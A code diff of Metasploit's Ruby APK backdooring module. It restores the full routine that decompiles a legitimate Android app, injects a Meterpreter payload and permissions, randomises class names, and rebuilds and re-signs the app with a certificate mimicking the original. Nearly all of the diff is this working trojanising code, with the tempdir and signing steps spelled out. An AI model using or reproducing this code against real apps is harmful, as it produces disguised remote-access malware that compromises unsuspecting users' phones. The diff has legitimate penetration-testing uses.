@@ -41,11 +41,10 @@ class Msf::Payload::Apk
     application = amanifest.xpath('//application')
     application_name = application.attribute("name")
     if application_name
-      return application_name.to_s
-      #application_str = application_name.to_s
-      #unless application_str == 'android.app.Application'
-        #return application_str
-      #end
+      application_str = application_name.to_s
+      unless application_str == 'android.app.Application'
+        return application_str
+      end
     end
     activities = amanifest.xpath("//activity|//activity-alias")
     for activity in activities
@@ -142,61 +141,61 @@ class Msf::Payload::Apk
   end
 
   def backdoor_apk(apkfile, raw_payload)
-    #unless apkfile && File.readable?(apkfile)
-      #usage
-      #raise RuntimeError, "Invalid template: #{apkfile}"
-    #end
+    unless apkfile && File.readable?(apkfile)
+      usage
+      raise RuntimeError, "Invalid template: #{apkfile}"
+    end
 
-    #keytool = run_cmd("keytool")
-    #unless keytool != nil
-      #raise RuntimeError, "keytool not found. If it's not in your PATH, please add it."
-    #end
+    keytool = run_cmd("keytool")
+    unless keytool != nil
+      raise RuntimeError, "keytool not found. If it's not in your PATH, please add it."
+    end
 
-    #jarsigner = run_cmd("jarsigner")
-    #unless jarsigner != nil
-      #raise RuntimeError, "jarsigner not found. If it's not in your PATH, please add it."
-    #end
+    jarsigner = run_cmd("jarsigner")
+    unless jarsigner != nil
+      raise RuntimeError, "jarsigner not found. If it's not in your PATH, please add it."
+    end
 
-    #zipalign = run_cmd("zipalign")
-    #unless zipalign != nil
-      #raise RuntimeError, "zipalign not found. If it's not in your PATH, please add it."
-    #end
+    zipalign = run_cmd("zipalign")
+    unless zipalign != nil
+      raise RuntimeError, "zipalign not found. If it's not in your PATH, please add it."
+    end
 
-    #apktool = run_cmd("apktool -version")
-    #unless apktool != nil
-      #raise RuntimeError, "apktool not found. If it's not in your PATH, please add it."
-    #end
+    apktool = run_cmd("apktool -version")
+    unless apktool != nil
+      raise RuntimeError, "apktool not found. If it's not in your PATH, please add it."
+    end
 
-    #apk_v = Gem::Version.new(apktool)
-    #unless apk_v >= Gem::Version.new('2.0.1')
-      #raise RuntimeError, "apktool version #{apk_v} not supported, please download at least version 2.0.1."
-    #end
+    apk_v = Gem::Version.new(apktool)
+    unless apk_v >= Gem::Version.new('2.0.1')
+      raise RuntimeError, "apktool version #{apk_v} not supported, please download at least version 2.0.1."
+    end
 
     #Create temporary directory where work will be done
-    tempdir = "/data/data/com.termux/files/home/ubuntu-fs/root/.bind/"
+    tempdir = Dir.mktmpdir
 
-    #keystore = "#{tempdir}/signing.keystore"
-    #storepass = "android"
-    #keypass = "android"
-    #keyalias = "signing.key"
-    #orig_cert_data = parse_orig_cert_data(apkfile)
-    #orig_cert_dname = orig_cert_data[0]
-    #orig_cert_startdate = orig_cert_data[1]
-    #orig_cert_validity = orig_cert_data[2]
+    keystore = "#{tempdir}/signing.keystore"
+    storepass = "android"
+    keypass = "android"
+    keyalias = "signing.key"
+    orig_cert_data = parse_orig_cert_data(apkfile)
+    orig_cert_dname = orig_cert_data[0]
+    orig_cert_startdate = orig_cert_data[1]
+    orig_cert_validity = orig_cert_data[2]
 
-    #print_status "Creating signing key and keystore..\n"
-    #run_cmd("keytool -genkey -v -keystore #{keystore} \
-    #-alias #{keyalias} -storepass #{storepass} -keypass #{keypass} -keyalg RSA \
-    #-keysize 2048 -startdate '#{orig_cert_startdate}' \
-    #-validity #{orig_cert_validity} -dname '#{orig_cert_dname}'")
+    print_status "Creating signing key and keystore..\n"
+    run_cmd("keytool -genkey -v -keystore #{keystore} \
+    -alias #{keyalias} -storepass #{storepass} -keypass #{keypass} -keyalg RSA \
+    -keysize 2048 -startdate '#{orig_cert_startdate}' \
+    -validity #{orig_cert_validity} -dname '#{orig_cert_dname}'")
 
-    #File.open("#{tempdir}/payload.apk", "wb") {|file| file.puts raw_payload }
-    #FileUtils.cp apkfile, "#{tempdir}/original.apk"
+    File.open("#{tempdir}/payload.apk", "wb") {|file| file.puts raw_payload }
+    FileUtils.cp apkfile, "#{tempdir}/original.apk"
 
-    #print_status "Decompiling original APK..\n"
-    #run_cmd("apktool d #{tempdir}/original.apk -o #{tempdir}/original")
-    #print_status "Decompiling payload APK..\n"
-    #run_cmd("apktool d #{tempdir}/payload.apk -o #{tempdir}/payload")
+    print_status "Decompiling original APK..\n"
+    run_cmd("apktool d #{tempdir}/original.apk -o #{tempdir}/original")
+    print_status "Decompiling payload APK..\n"
+    run_cmd("apktool d #{tempdir}/payload.apk -o #{tempdir}/payload")
 
     amanifest = parse_manifest("#{tempdir}/original/AndroidManifest.xml")
 
@@ -225,7 +224,7 @@ class Msf::Payload::Apk
     FileUtils.rm Dir.glob("#{tempdir}/payload/smali/com/metasploit/stage/R*.smali")
 
     package = amanifest.xpath("//manifest").first['package']
-    package = package + ".#{Rex::Text::rand_text_alpha_lower(5)}"
+    package = package.downcase + ".#{Rex::Text::rand_text_alpha_lower(5)}"
     classes = {}
     classes['Payload'] = Rex::Text::rand_text_alpha_lower(5).capitalize
     classes['MainService'] = Rex::Text::rand_text_alpha_lower(5).capitalize
@@ -264,22 +263,22 @@ class Msf::Payload::Apk
     print_status "Poisoning the manifest with meterpreter permissions..\n"
     fix_manifest(tempdir, package, classes['MainService'], classes['MainBroadcastReceiver'])
 
-    #print_status "Rebuilding #{apkfile} with meterpreter injection as #{injected_apk}\n"
-    #apktool_output = run_cmd("apktool b -o #{injected_apk} #{tempdir}/original")
-    #unless File.readable?(injected_apk)
-      #print_error apktool_output
-      #raise RuntimeError, "Unable to rebuild apk with apktool"
-    #end
+    print_status "Rebuilding #{apkfile} with meterpreter injection as #{injected_apk}\n"
+    apktool_output = run_cmd("apktool b -o #{injected_apk} #{tempdir}/original")
+    unless File.readable?(injected_apk)
+      print_error apktool_output
+      raise RuntimeError, "Unable to rebuild apk with apktool"
+    end
 
-    #print_status "Signing #{injected_apk}\n"
-    #run_cmd("jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore #{keystore} -storepass #{storepass} -keypass #{keypass} #{injected_apk} #{keyalias}")
-    print_status "Now..goto ubuntu and Recompile..\n"
-    #run_cmd("zipalign 4 #{injected_apk} #{aligned_apk}")
+    print_status "Signing #{injected_apk}\n"
+    run_cmd("jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore #{keystore} -storepass #{storepass} -keypass #{keypass} #{injected_apk} #{keyalias}")
+    print_status "Aligning #{injected_apk}\n"
+    run_cmd("zipalign 4 #{injected_apk} #{aligned_apk}")
 
-    #outputapk = File.read(aligned_apk)
+    outputapk = File.read(aligned_apk)
 
-    #FileUtils.remove_entry tempdir
-    #outputapk
+    FileUtils.remove_entry tempdir
+    outputapk
   end
 end
 
